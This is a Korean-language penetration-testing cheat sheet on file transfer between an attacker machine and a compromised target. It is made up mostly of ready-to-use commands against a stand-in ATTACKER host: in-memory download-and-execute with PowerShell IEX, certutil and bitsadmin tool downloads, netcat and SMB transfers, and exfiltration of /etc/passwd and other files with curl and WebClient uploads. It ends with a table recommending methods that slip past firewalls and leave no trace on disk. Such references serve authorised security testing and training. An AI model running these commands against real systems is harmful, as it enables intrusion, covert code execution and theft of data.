# File Transfer

공격자 ↔ target 사이 파일 옮기기 — tool 올리기, loot 내리기. 호스트 환경 / OS / 외부 통신 여부에 따라 쓸 수 있는 방법이 완전히 달라진다.

---

## 공격자 → target (다운로드)

### HTTP

```bash
# 공격자: HTTP 서버
python3 -m http.server 8080
php -S 0.0.0.0:8080

# Linux target
wget http://ATTACKER:8080/file -O /tmp/file
curl http://ATTACKER:8080/file -o /tmp/file

# Windows target
# PowerShell
Invoke-WebRequest -Uri http://ATTACKER:8080/file -OutFile C:\temp\file
iwr http://ATTACKER:8080/file -o C:\temp\file
(New-Object Net.WebClient).DownloadFile('http://ATTACKER:8080/file','C:\temp\file')
# 메모리 로드 (디스크에 안 남김)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER:8080/script.ps1')

# certutil
certutil -urlcache -split -f http://ATTACKER:8080/file C:\temp\file

# bitsadmin
bitsadmin /transfer job /download /priority high http://ATTACKER:8080/file C:\temp\file
```

### SMB

```bash
# 공격자: SMB 서버
impacket-smbserver share /path/to/files -smb2support

# 인증 필요 시
impacket-smbserver share /path -smb2support -username user -password pass

# Windows target
copy \\ATTACKER\share\file C:\temp\file
# 또는 네트워크 드라이브
net use Z: \\ATTACKER\share /user:user pass
copy Z:\file C:\temp\file
net use Z: /delete
```

### SCP / SFTP

```bash
# SCP
scp file user@TARGET:/tmp/file
scp user@TARGET:/remote/file /local/path

# SFTP
sftp user@TARGET
put file /tmp/file
get /remote/file /local/path
```

### Netcat

```bash
# 수신 측
nc -lvnp 4444 > received_file

# 송신 측
nc RECEIVER 4444 < file_to_send
cat file_to_send | nc RECEIVER 4444
```

---

## target → 공격자 (업로드)

### HTTP Upload

```bash
# 공격자: upload 서버
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import cgi
class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        form = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD':'POST'})
        f = form['file']
        open(f.filename, 'wb').write(f.file.read())
        self.send_response(200)
        self.end_headers()
HTTPServer(('0.0.0.0',8080), Handler).serve_forever()
"

# 또는 uploadserver 모듈 사용
pip3 install uploadserver
python3 -m uploadserver 8080

# target에서 업로드
curl -F 'file=@/etc/passwd' http://ATTACKER:8080/upload
```

---

## 인코딩 전송

### Base64

```bash
# 송신
base64 -w0 file
# 출력된 문자열 복사

# 수신 (Linux)
echo "BASE64_DATA" | base64 -d > file

# 수신 (Windows PowerShell)
[IO.File]::WriteAllBytes("C:\temp\file", [Convert]::FromBase64String("BASE64_DATA"))
```

### Hex

```bash
# 송신
xxd -p file | tr -d '\n'

# 수신 (Linux)
echo "HEX_DATA" | xxd -r -p > file

# 수신 (Windows PowerShell)
$h = "HEX_DATA"; $b = [byte[]]::new($h.Length/2); for($i=0;$i-lt$h.Length;$i+=2){$b[$i/2]=[Convert]::ToByte($h.Substring($i,2),16)}; [IO.File]::WriteAllBytes("C:\temp\file",$b)
```

---

## Windows 전용

```powershell
# PowerShell WebClient
(New-Object Net.WebClient).UploadFile('http://ATTACKER:8080/upload', 'C:\temp\file')

# PowerShell Copy (SMB)
Copy-Item -Path C:\temp\file -Destination \\ATTACKER\share\file

# PowerShell Compress & Transfer
Compress-Archive -Path C:\temp\* -DestinationPath C:\temp\archive.zip
```

---

## 전송 방법 선택 가이드

| 상황 | 추천 방법 |
|------|----------|
| Linux → Linux | `scp`, `curl/wget` |
| Linux → Windows | `impacket-smbserver`, `python http.server` |
| Windows → Linux | `IWR`/`certutil` + HTTP, SMB |
| 방화벽 제한 (443만 허용) | HTTPS, DNS 터널링 |
| 바이너리 전송 불가 | Base64 인코딩 |
| 대용량 파일 | SMB, SCP |
| 디스크에 안 남기고 싶을 때 | `IEX(...)`, PowerShell 메모리 로드 |
